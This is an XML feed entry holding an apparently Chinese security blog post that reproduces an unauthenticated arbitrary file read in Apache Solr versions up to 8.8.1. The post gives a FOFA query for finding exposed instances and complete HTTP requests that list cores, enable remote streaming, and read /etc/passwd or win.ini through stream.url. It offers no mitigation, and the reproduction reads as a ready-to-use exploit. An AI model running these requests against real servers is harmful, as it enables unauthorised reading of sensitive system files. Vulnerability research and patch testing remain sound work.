    <entry>
      <title>Apache Solr 任意文件读取</title>
      <link href="/2021/10/14/apache-solr-ren-yi-wen-jian-du-qu/"/>
      <url>/2021/10/14/apache-solr-ren-yi-wen-jian-du-qu/</url>
      
        <content type="html"><![CDATA[<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>Apache Solr</code> 默认安装情况下可未授权访问，导致可以在未授权的情况下获取目标服务器敏感文件。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><code>Apache Solr</code> &lt;= 8.8.1</p><h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><pre class="line-numbers language-FOFA" data-language="FOFA"><code class="language-FOFA">app="Solr"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1、访问以下链接获取Solr-core的name"><a href="#1、访问以下链接获取Solr-core的name" class="headerlink" title="1、访问以下链接获取Solr core的name"></a>1、访问以下链接获取Solr core的name</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//ip:8983/solr/admin/cores?indexInfo=false&amp;wt=json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211014142027709.png" alt="获取core name"></p><h3 id="2、设置启用远程流传输"><a href="#2、设置启用远程流传输" class="headerlink" title="2、设置启用远程流传输"></a>2、设置启用远程流传输</h3><pre class="line-numbers language-POST数据包" data-language="POST数据包"><code class="language-POST数据包">POST /solr/[core name]/config HTTP/1.1Host: ip:8983User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-type:application/jsonConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 82{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211014142347372.png" alt="设置启用远程流传输"></p><h3 id="3、文件读取"><a href="#3、文件读取" class="headerlink" title="3、文件读取"></a>3、文件读取</h3><pre class="line-numbers language-POST数据包" data-language="POST数据包"><code class="language-POST数据包">GET /solr/[core name]/debug/dump?param=ContentStreams HTTP/1.1Host: ip:8983User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 29stream.url=file:///etc/passwd（linux）stream.url=file:///C:/Windows/win.ini（windows）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211014142614773.png" alt="Linux文件读取"></p><p><img src="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/image-20211014143134776.png" alt="Windows文件读取"></p>]]></content>
      
      
